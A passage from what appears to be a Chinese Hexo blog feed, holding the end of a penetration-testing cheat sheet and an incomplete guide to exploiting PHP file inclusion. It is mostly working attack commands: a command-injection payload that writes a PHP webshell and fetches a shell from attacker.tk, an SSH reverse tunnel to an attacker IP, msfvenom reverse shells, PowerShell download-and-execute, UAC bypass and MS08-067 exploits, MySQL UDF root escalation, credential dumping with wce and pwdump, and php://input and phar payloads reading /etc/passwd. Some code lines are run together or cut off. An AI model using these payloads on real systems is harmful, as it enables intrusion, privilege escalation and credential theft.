https://downloads.skullsecurity.org/dnscat2/</span><br><span class="line"># https://github.com/lukebaggett/dnscat2-powershell</span><br><span class="line">$ dnscat --host &lt;dnscat server_ip&gt;</span><br></pre></td></tr></table></figure>

<h3 id="编译-Assemble-代码"><a href="#编译-Assemble-代码" class="headerlink" title="编译 Assemble 代码"></a>编译 Assemble 代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nasm -f elf32 simple32.asm -o simple32.o</span><br><span class="line">$ ld -m elf_i386 simple32.o simple32</span><br><span class="line"></span><br><span class="line">$ nasm -f elf64 simple.asm -o simple.o</span><br><span class="line">$ ld simple.o -o simple</span><br></pre></td></tr></table></figure>

<h3 id="使用非交互-Shell-打入内网"><a href="#使用非交互-Shell-打入内网" class="headerlink" title="使用非交互 Shell 打入内网"></a>使用非交互 Shell 打入内网</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 生成 shell 使用的 ssh 密钥</span><br><span class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=whoami&quot;</span><br><span class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \&quot;\&quot; &quot;</span><br><span class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot;</span><br><span class="line"></span><br><span class="line"># 增加用户 tempuser </span><br><span class="line">$ useradd -m tempuser</span><br><span class="line">$ mkdir /home/tempuser/.ssh &amp;&amp; chmod 700 /home/tempuser/.ssh</span><br><span class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot; &gt; /home/tempuser/.ssh/authorized_keys</span><br><span class="line">$ chmod 700 /home/tempuser/.ssh/authorized_keys</span><br><span class="line">$ chown -R tempuser:tempuser /home/tempuser/.ssh</span><br><span class="line"></span><br><span class="line"># 反弹 ssh shell</span><br><span class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@&lt;attacker_ip&gt;&quot;</span><br></pre></td></tr></table></figure>

<h3 id="利用-POST-远程命令执行获取-Shell"><a href="#利用-POST-远程命令执行获取-Shell" class="headerlink" title="利用 POST 远程命令执行获取 Shell"></a>利用 POST 远程命令执行获取 Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">attacker:~$ curl -i -s -k  -X &#x27;POST&#x27; --data-binary $&#x27;IP=%3Bwhoami&amp;submit=submit&#x27; &#x27;http://victum.tk/command.php&#x27;</span><br><span class="line"></span><br><span class="line">attacker:~$ curl -i -s -k  -X &#x27;POST&#x27; --data-binary $&#x27;IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&amp;submit=submit&#x27; &#x27;http://victum.tk/command.php&#x27;</span><br><span class="line"></span><br><span class="line">attacker:~$ curl http://victum.tk/shell.php?cmd=id</span><br><span class="line"></span><br><span class="line"># 在服务器上下载 shell (phpshell.php)</span><br><span class="line"></span><br><span class="line">http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27</span><br><span class="line"></span><br><span class="line"># 运行 nc 并执行 phpshell.php</span><br><span class="line">attacker:~$ nc -nvlp 1337</span><br></pre></td></tr></table></figure>

<h3 id="以管理员身份在-Win7-上反弹具有系统权限的-Shell"><a href="#以管理员身份在-Win7-上反弹具有系统权限的-Shell" class="headerlink" title="以管理员身份在 Win7 上反弹具有系统权限的 Shell"></a>以管理员身份在 Win7 上反弹具有系统权限的 Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom –p windows/shell_reverse_tcp LHOST=192.168.56.102 –f exe &gt; danger.exe</span><br><span class="line"></span><br><span class="line"># 显示账户配置</span><br><span class="line">net user &lt;login&gt;</span><br><span class="line"></span><br><span class="line"># Kali 上下载 psexec</span><br><span class="line"></span><br><span class="line">https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx</span><br><span class="line"></span><br><span class="line"># 使用 powershell 脚本上传 psexec.exe 到目标机器</span><br><span class="line">echo $client = New-Object System.Net.WebClient &gt; script.ps1</span><br><span class="line">echo $targetlocation = &quot;http://192.168.56.102/PsExec.exe&quot; &gt;&gt; script.ps1</span><br><span class="line">echo $client.DownloadFile($targetlocation,&quot;psexec.exe&quot;) &gt;&gt; script.ps1</span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1</span><br><span class="line"></span><br><span class="line"># 使用 powershell 脚本上传 danger.exe 到目标机器</span><br><span class="line">echo $client = New-Object System.Net.WebClient &gt; script2.ps1</span><br><span class="line">echo $targetlocation = &quot;http://192.168.56.102/danger.exe&quot; &gt;&gt; script2.ps1</span><br><span class="line">echo $client.DownloadFile($targetlocation,&quot;danger.exe&quot;) &gt;&gt; script2.ps1</span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1</span><br><span class="line"></span><br><span class="line"># 使用预编译的二进制文件绕过 UAC:</span><br><span class="line"></span><br><span class="line">https://github.com/hfiref0x/UACME</span><br><span class="line"></span><br><span class="line"># 使用 powershell 脚本上传 https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe 到目标机器</span><br><span class="line">echo $client = New-Object System.Net.WebClient &gt; script2.ps1</span><br><span class="line">echo $targetlocation = &quot;http://192.168.56.102/Akagi64.exe&quot; &gt;&gt; script3.ps1</span><br><span class="line">echo $client.DownloadFile($targetlocation,&quot;Akagi64.exe&quot;) &gt;&gt; script3.ps1</span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1</span><br><span class="line"></span><br><span class="line"># 在 Kali 上创建监听</span><br><span class="line">nc -lvp 4444</span><br><span class="line"></span><br><span class="line"># 以系统权限使用 Akagi64 运行 danger.exe </span><br><span class="line">Akagi64.exe 1 C:\Users\User\Desktop\danger.exe</span><br><span class="line"></span><br><span class="line"># 在 Kali 上创建监听</span><br><span class="line">nc -lvp 4444</span><br><span class="line"></span><br><span class="line"># 下一步就会反弹给我们一个提过权的 shell</span><br><span class="line"># 以系统权限使用 PsExec 运行 danger.exe </span><br><span class="line">psexec.exe –i –d –accepteula –s danger.exe</span><br></pre></td></tr></table></figure>

<h3 id="以普通用户身份在-Win7-上反弹具有系统权限的-Shell"><a href="#以普通用户身份在-Win7-上反弹具有系统权限的-Shell" class="headerlink" title="以普通用户身份在 Win7 上反弹具有系统权限的 Shell"></a>以普通用户身份在 Win7 上反弹具有系统权限的 Shell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051</span><br><span class="line"></span><br><span class="line">https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https://www.exploit-db.com/exploits/37049/</span><br><span class="line"></span><br><span class="line"># 查找目标机器是否安装了补丁，输入如下命令</span><br><span class="line">wmic qfe get</span><br><span class="line">wmic qfe | find &quot;3057191&quot;</span><br><span class="line"></span><br><span class="line"># 上传编译后的利用程序并运行它</span><br><span class="line"></span><br><span class="line">https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe</span><br><span class="line"></span><br><span class="line"># 默认情况下其会以系统权限执行 cmd.exe，但我们需要改变源代码以运行我们上传的 danger.exe</span><br><span class="line"># https://github.com/hfiref0x/CVE-2015-1701 下载它并定位到 &quot;main.c&quot;</span><br><span class="line"></span><br><span class="line"># 使用 wce.exe 获取已登录用户的明文账号密码</span><br><span class="line"></span><br><span class="line">http://www.ampliasecurity.com/research/windows-credentials-editor/</span><br><span class="line"></span><br><span class="line">wce -w</span><br><span class="line"></span><br><span class="line"># 使用 pwdump7 获取其他用户的密码哈希值</span><br><span class="line"></span><br><span class="line">http://www.heise.de/download/pwdump.html</span><br><span class="line"></span><br><span class="line"># we can try online hash cracking tools such crackstation.net</span><br></pre></td></tr></table></figure>

<h3 id="MS08-067-–-不使用-Metasploit"><a href="#MS08-067-–-不使用-Metasploit" class="headerlink" title="MS08-067 – 不使用 Metasploit"></a>MS08-067 – 不使用 Metasploit</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205</span><br><span class="line">$ searchsploit ms08-067</span><br><span class="line">$ python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1</span><br></pre></td></tr></table></figure>

<h3 id="通过-MySQL-Root-账户实现提权"><a href="#通过-MySQL-Root-账户实现提权" class="headerlink" title="通过 MySQL Root 账户实现提权"></a>通过 MySQL Root 账户实现提权</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)</span><br><span class="line">$ wget 0xdeadbeef.info/exploits/raptor_udf2.c</span><br><span class="line">$ gcc -g -c raptor_udf2.c</span><br><span class="line">$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line">mysql -u root -p</span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">mysql&gt; insert into foo values(load_file(&#x27;/home/user/raptor_udf2.so&#x27;));</span><br><span class="line">mysql&gt; select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;;</span><br><span class="line">mysql&gt; create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;;</span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">mysql&gt; select do_system(&#x27;echo &quot;root:passwd&quot; | chpasswd &gt; /tmp/out; chown user:user /tmp/out&#x27;);</span><br><span class="line"></span><br><span class="line">user:~$ su -</span><br><span class="line">Password:</span><br><span class="line">user:~# whoami</span><br><span class="line">root</span><br><span class="line">root:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<h3 id="使用-LD-PRELOAD-注入程序"><a href="#使用-LD-PRELOAD-注入程序" class="headerlink" title="使用 LD_PRELOAD 注入程序"></a>使用 LD_PRELOAD 注入程序</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ wget https://github.com/jivoi/pentest/ldpreload_shell.c</span><br><span class="line">$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so</span><br><span class="line">$ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft</span><br></pre></td></tr></table></figure>

<h3 id="针对-OpenSSH-用户进行枚举时序攻击"><a href="#针对-OpenSSH-用户进行枚举时序攻击" class="headerlink" title="针对 OpenSSH 用户进行枚举时序攻击"></a>针对 OpenSSH 用户进行枚举时序攻击</h3><p>注：枚举时序攻击(“Enumeration Timing Attack”)属于侧信道攻击/旁路攻击(Side Channel Attack)，侧信道攻击是指利用信道外的信息，比如加解密的速度/加解密时芯片引脚的电压/密文传输的流量和途径等进行攻击的方式，一个词形容就是“旁敲侧击”。–参考自 <a href="http://zhihu.com/question/20156213/answer/43377769">shotgun</a> 在知乎上的解释。</p>
<p>osueta 是一个用于对 OpenSSH 进行时序攻击的 python2 脚本，其可以利用时序攻击枚举 OpenSSH 用户名，并在一定条件下可以对 OpenSSH 服务器进行 DOS 攻击。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># https://github.com/c0r3dump3d/osueta</span><br><span class="line">$ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes</span><br><span class="line">$ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes –dos no -L userfile.txt</span><br></pre></td></tr></table></figure>

<h3 id="使用-ReDuh-构造合法的-HTTP-请求以建立-TCP-通道"><a href="#使用-ReDuh-构造合法的-HTTP-请求以建立-TCP-通道" class="headerlink" title="使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道"></a>使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道</h3><p>注： ReDuh 是一个通过 HTTP 协议建立隧道传输各种其他数据的工具。其可以把内网服务器的端口通过 http/https 隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。</p>
<p>对了亲～ReDuh-Gui 号称端口转发神器哦。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># https://github.com/sensepost/reDuh</span><br><span class="line"></span><br><span class="line"># 步骤 1</span><br><span class="line"># 上传 reDuh.jsp 目标服务器</span><br><span class="line">$ http://192.168.10.50/uploads/reDuh.jsp</span><br><span class="line"></span><br><span class="line"># 步骤 2</span><br><span class="line"># 在本机运行 reDuhClient </span><br><span class="line">$ java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp</span><br><span class="line"></span><br><span class="line"># 步骤 3</span><br><span class="line"># 使用 nc 连接管理端口</span><br><span class="line">$ nc -nvv 127.0.0.1 1010</span><br><span class="line"></span><br><span class="line"># 步骤 4</span><br><span class="line"># 使用隧道转发本地端口到远程目标端口</span><br><span class="line">[createTunnel] 7777:172.16.0.4:3389</span><br><span class="line"></span><br><span class="line"># 步骤 5</span><br><span class="line"># 使用 RDP 连接远程</span><br><span class="line">$ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP文件包含漏洞利用思路与Bypass总结（不完整）</title>
    <url>/2020/05/10/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E4%B8%8EBypass%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%89/</url>
    <content><![CDATA[<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="四个函数"><a href="#四个函数" class="headerlink" title="四个函数"></a>四个函数</h2><p>当利用下面这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。</p>
<p>php中引发文件包含漏洞的通常主要是以下四个函数：</p>
<p><strong>1、include()</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.php.net/manual/en/function.include.php</span><br></pre></td></tr></table></figure>

<p><strong>2、include_once()</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://php.net/manual/en/function.include-once.php</span><br></pre></td></tr></table></figure>

<p><strong>3、require()</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://php.net/manual/en/function.require.php</span><br></pre></td></tr></table></figure>

<p><strong>4、require_once()</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://php.net/manual/en/function.require-once.php</span><br></pre></td></tr></table></figure>



<h2 id="函数差异"><a href="#函数差异" class="headerlink" title="函数差异"></a>函数差异</h2><p><strong>include()</strong></p>
<p>include() 函数包含出错的话，只会提出警告，不会影响后续语句的执行</p>
<p><strong>require()</strong></p>
<p>require() 函数包含出错的话，则会直接退出，后续语句不在执行</p>
<p><strong>include_once() 和 require_once()</strong></p>
<p>require_once() 和 include_once() 功能与require() 和 include() 类似。但如果一个文件已经被包含过了，则 require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。</p>
<h1 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h1><p>文件包含函数所加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致执行了非预期的代码。</p>
<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p>LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。同时借助此漏洞也可以查看服务器上的一些重要文件。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。</p>
<p>例如本地读取<code>/etc/passwd</code>系统重要文件</p>
<h2 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h2><p>RFI(Remote File Inclusion) 远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_fopen = Onallow_url_include = On</span><br><span class="line">allow_url_fopen = On</span><br></pre></td></tr></table></figure>

<p>该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_include：On</span><br></pre></td></tr></table></figure>

<p>该选项为on便是允许 包含URL 对象文件等。</p>
<p>两个配置选项均需要为On，才能远程包含文件成功</p>
<p><strong>注意</strong></p>
<p>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php5.5.9 -&gt; php.ini</span><br></pre></td></tr></table></figure>



<h1 id="包含姿势"><a href="#包含姿势" class="headerlink" title="包含姿势"></a>包含姿势</h1><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RARogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>

<p>可以在phpinfo中的<code>Registered PHP Streams</code>中找到可使用的协议。</p>
<p>下面测试代码均为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php    $file  = $_GET[&#x27;file&#x27;];    include($file);?&gt;</span><br></pre></td></tr></table></figure>

<p>若有特殊案例，会声明。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php.ini</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_fopen 默认为 Onallow_url_include 默认为 Off</span><br></pre></td></tr></table></figure>

<p>若有特殊要求，会在利用条件里指出。</p>
<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。</p>
<p><strong>参数</strong></p>
<p><img src="/.io//Users\whites\Desktop\日常\图片寄存\文件上传与Bypass\1.png" alt="image-20200510200703577"></p>
<p><strong>过滤器列表</strong></p>
<ul>
<li>字符串过滤器</li>
<li>string.strip_tags</li>
<li>转换过滤器</li>
<li>压缩过滤器</li>
<li>加密过滤器</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可用过滤器列表：https://www.php.net/manual/zh/filters.php</span><br></pre></td></tr></table></figure>

<p><strong>利用条件</strong>：无</p>
<p><strong>利用姿势1</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。同时也能够对网站源码进行审计。</p>
<p><strong>利用姿势2</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?file=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>

<p>效果跟前面一样，只是少了个read关键字，在绕过一些waf时也许有用。</p>
<h3 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h3><p>专们用于访问本地文件系统和php://filter类似都可以对本地文件进行读取</p>
<p><strong>用法</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/path/to/file.extrelative/path/to/file.extfileInCwd.extC:/path/to/winfile.extC:\path\to\winfile.ext\\smbserver\share\path\to\winfile.extfile:///path/to/file.ext</span><br><span class="line">?file=file://[文件的绝对路径+文件名]</span><br></pre></td></tr></table></figure>

<p><strong>利用条件</strong>：无</p>
<p><strong>利用姿势</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?file=file:///etc/passwd</span><br></pre></td></tr></table></figure>





<h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p><code>php://input</code>是个可以访问请求的原始数据的只读流，将post请求中的数据作为PHP代码执行。</p>
<p><strong>利用条件</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_include = Onallow_url_fopen = On/Off</span><br></pre></td></tr></table></figure>

<p><strong>利用姿势</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?file=php://input</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">&lt;?php phpinfo();?&gt;/&lt;? phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>也可以使用<code>burpsuite</code>或<code>curl</code>进行利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v &quot;http://127.0.0.1/FI/index.php?file=php://input&quot; -d &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">Getshell</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">&lt;?PHP                                                        ?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>file_get_contents()的利用</strong></p>
<p><code>file_get_contents()</code>函数将整个文件读入一个字符串中</p>
<p>测试代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php$file  = $_GET[&#x27;file&#x27;];if(file_get_contents($file,&#x27;r&#x27;) == &quot;Qftm&quot;)&#123;    echo &quot;you are Admin!!!&quot;;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p>利用条件：无</p>
<p>利用姿势：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get.php?file=php://input</span><br><span class="line">POST:Qftm</span><br></pre></td></tr></table></figure>

<p><code>php://input</code>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
<h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p><code>phar://</code> 支持<code>zip</code>、<code>phar</code>格式的文件包含。</p>
<ul>
<li><strong>zip</strong></li>
</ul>
<p><strong>用法</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=phar://[压缩包文件相对路径]/[压缩文件内的子文件名]?file=phar://[压缩包文件绝对路径]/[压缩文件内的子文件名]</span><br></pre></td></tr></table></figure>

<p><strong>利用条件</strong>：php &gt;= 5.3.0</p>
<p><strong>利用姿势1</strong>：</p>
<p>配合文件上传漏洞，当仅可以上传zip格式时</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?file=phar://index.zip/index.txt</span><br><span class="line">index.php?file=phar://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/index.zip/index.txt</span><br></pre></td></tr></table></figure>

<p>新建index.txt，使用zip格式压缩 -&gt; index.zip</p>
<p><strong>利用姿势2</strong>：</p>
<p>配合文件上传漏洞，当仅可以上传图片格式时</p>
<p>针对<code>phar://</code>不管后缀是什么，都会当做压缩包来解压。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?file=phar://head.png/head.txt</span><br><span class="line">index.php?file=phar://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/head.png/head.txt</span><br></pre></td></tr></table></figure>

<p>将做好的zip后缀改为png格式</p>
<ul>
<li><strong>phar</strong></li>
</ul>
<p>phar文件本质上是也一种压缩文件。</p>
<p><strong>用法</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=phar://[压缩包文件相对路径]/[压缩文件内的子文件名]?file=phar://[压缩包文件绝对路径]/[压缩文件内的子文件名]</span><br></pre></td></tr></table></figure>

<p><strong>制作phar文件</strong>：</p>
<p>制作包含恶意代码文件的phar文件</p>
<p>（1）确保本地<code>php.ini</code>中<code>phar.readonly=Off</code></p>
<p>（2）编写恶意phar文件的php脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phar.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php    @unlink(&quot;phar.phar&quot;);    $phar = new Phar(&quot;phar.phar&quot;);    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);  //设置stub    $phar-&gt;addFromString(&quot;head.txt&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;);  //添加要压缩的文件及内容    //签名自动计算     $phar-&gt;stopBuffering();?&gt;</span><br></pre></td></tr></table></figure>

<p>（3）生成phar文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">addFromString(&#x27;testfile.txt&#x27;, &#x27;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>



<p>利用条件**：php &gt;= 5.3.0</p>
<p><strong>利用姿势1</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?file=phar://phar.phar/head.txt</span><br><span class="line">index.php?file=phar://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/phar.phar/head.txt</span><br></pre></td></tr></table></figure>

<p><strong>利用姿势2</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?file=phar://phar.png/head.txt</span><br><span class="line">index.php?file=phar://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/phar.png/head.txt</span><br></pre></td></tr></table></figure>

<p>利用协议特性，更改后缀文件可适当绕过一些限制</p>
<h3 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h3><p><code>zip协议</code>和<code>phar协议</code>类似，都支持<code>相对路径</code>和<code>绝对路径</code>（几乎网上所有人都说<code>zip协议</code>不支持<code>相对路径</code>，事实上是可以！！！）</p>
<p>在<code>php version 5.2.9</code>时已经修复<code>zip://</code>相对路径问题</p>
<p>使用zip协议，需将<code>#</code>编码为<code>%23</code>(浏览器时)</p>
<p><strong>用法</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=zip://[压缩包文件相对路径]#[压缩文件内的子文件名]?file=zip://[压缩包文件绝对路径]#[压缩文件内的子文件名]</span><br></pre></td></tr></table></figure>

<p><strong>利用条件</strong>：php &gt;= 5.2（绝对路径） | php &gt;= 5.29（相对/绝对路径）</p>
<p><strong>利用姿势1</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?file=zip://head.zip%23head.txt</span><br><span class="line">index.php?file=zip://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/head.zip%23head.txt</span><br></pre></td></tr></table></figure>

<p><strong>利用姿势2</strong>：</p>
<p>针对<code>zip://</code>不管后缀是什么，都会当做压缩包来解压，可以适当的绕过一些限制。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?file=zip://head.png%23head.txt</span><br><span class="line">index.php?file=zip://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/head.png%23head.txt</span><br></pre></td></tr></table></figure>





<h3 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2://"></a>bzip2://</h3><p><strong>用法</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=compress.bzip2://[压缩包文件相对路径]?file=compress.bzip2://[压缩包文件绝对路径]</span><br></pre></td></tr></table></figure>

<p><strong>利用条件</strong>：php &gt;= 5.2</p>
<p><strong>利用姿势1</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?file=compress.bzip2://head.bz2</span><br><span class="line">index.php?file=compress.bzip2://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/head.bz2</span><br></pre></td></tr></table></figure>

<p><strong>利用姿势2</strong>：</p>
<p>利用协议特性，更改后缀文件可适当绕过一些限制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?file=compress.bzip2://head.jpg</span><br><span class="line">index.php?file=compress.bzip2://D:/QSoftware/W3Server/phpstudy2019/WWW/FI/head.jpg</span><br></pre></td></tr></table></figure>





